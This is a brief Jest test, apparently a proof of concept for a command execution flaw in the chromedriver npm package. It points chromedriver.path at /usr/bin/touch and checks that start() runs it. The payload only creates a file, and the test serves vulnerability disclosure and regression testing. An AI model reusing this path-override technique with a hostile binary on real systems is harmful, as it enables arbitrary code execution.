test("Remote code execution for chromedriver", (done) => {
  const fs = require('fs');
  const chromedriver = require('chromedriver');

  const path = "./chromedriver";
  if (fs.existsSync(path))
    fs.unlinkSync(path);

  var file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  chromedriver.path = "/usr/bin/touch";

  const args = [ path ];
  chromedriver.start(args, false);

  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, (err) => { done(); });
})
